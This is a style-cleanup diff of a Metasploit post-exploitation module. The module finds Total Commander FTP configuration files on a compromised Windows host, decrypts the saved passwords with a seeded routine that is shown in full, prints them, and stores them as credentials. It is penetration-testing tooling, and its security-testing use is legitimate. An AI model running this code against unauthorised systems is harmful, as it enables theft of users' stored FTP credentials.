@@ -40,21 +40,21 @@ class MetasploitModule < Msf::Post
     print_status('Checking Default Locations...')
     check_systemroot
 
-    grab_user_profiles().each do |user|
-      next if user['AppData'] == nil
-      next if user['ProfileDir'] == nil
+    grab_user_profiles.each do |user|
+      next if user['AppData'].nil?
+      next if user['ProfileDir'].nil?
 
       check_userdir(user['ProfileDir'])
       check_appdata(user['AppData'])
     end
 
-    commander_key = "HKLM\\Software\\Ghisler\\Total Commander"
+    commander_key = 'HKLM\\Software\\Ghisler\\Total Commander'
     hklmpath = registry_getvaldata(commander_key, 'FtpIniName')
     case hklmpath
     when nil
       print_status('Total Commander Does not Appear to be Installed Globally')
     when 'wcx_ftp.ini'
-      print_status("Already Checked SYSTEMROOT")
+      print_status('Already Checked SYSTEMROOT')
     when '.\\wcx_ftp.ini'
       hklminstpath = registry_getvaldata(commander_key, 'InstallDir') || ''
       if hklminstpath.empty?
@@ -70,9 +70,9 @@ class MetasploitModule < Msf::Post
       check_other(hklmpath)
     end
 
-    userhives = load_missing_hives()
+    userhives = load_missing_hives
     userhives.each do |hive|
-      next if hive['HKU'] == nil
+      next if hive['HKU'].nil?
 
       print_status("Looking at Key #{hive['HKU']}")
       profile_commander_key = "#{hive['HKU']}\\Software\\Ghisler\\Total Commander"
@@ -82,7 +82,7 @@ class MetasploitModule < Msf::Post
       when nil
         print_status('Total Commander Does not Appear to be Installed on This User')
       when 'wcx_ftp.ini'
-        print_status("Already Checked SYSTEMROOT")
+        print_status('Already Checked SYSTEMROOT')
       when '.\\wcx_ftp.ini'
         hklminstpath = registry_getvaldata(profile_commander_key, 'InstallDir') || ''
         if hklminstpath.empty?
@@ -113,7 +113,7 @@ class MetasploitModule < Msf::Post
   end
 
   def check_systemroot
-    winpath = expand_path("%SYSTEMROOT%\\wcx_ftp.ini")
+    winpath = expand_path('%SYSTEMROOT%\\wcx_ftp.ini')
     check_other(winpath)
   end
 
@@ -137,7 +137,7 @@ class MetasploitModule < Msf::Post
 
     credential_data = {
       module_fullname: fullname,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
@@ -147,7 +147,7 @@ class MetasploitModule < Msf::Post
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
@@ -159,18 +159,18 @@ class MetasploitModule < Msf::Post
     ini = Rex::Parser::Ini.from_s(parse)
 
     ini.each_key do |group|
-      next if group == 'General' or group == 'default' or group == 'connections'
+      next if (group == 'General') || (group == 'default') || (group == 'connections')
 
       print_status("Processing Saved Session #{group}")
       host = ini[group]['host']
 
       username = ini[group]['username']
       passwd = ini[group]['password']
-      next if passwd == nil
+      next if passwd.nil?
 
       passwd = decrypt(passwd)
       (host, port) = host.split(':')
-      port = 21 if port == nil
+      port = 21 if port.nil?
       print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
       if session.db_record
         source_id = session.db_record.id
@@ -205,7 +205,7 @@ class MetasploitModule < Msf::Post
 
     pwd.scan(/../) { |a| pwd2 << (a.to_i 16) }
 
-    len = (pwd2.length) - 4
+    len = pwd2.length - 4
 
     pwd3 = []
     @vseed = 849521
@@ -216,7 +216,7 @@ class MetasploitModule < Msf::Post
     end
 
     @vseed = 12345
-    (0..255).each do |i|
+    256.times do |_i|
       a = seed(len)
       b = seed(len)
       t = pwd3[a]
@@ -235,7 +235,7 @@ class MetasploitModule < Msf::Post
       pwd3[i] = (pwd3[i] - foo) & 0xff
     end
 
-    fpwd = ""
+    fpwd = ''
     pwd3[0, len].map { |a| fpwd << a.chr }
     return fpwd
   end
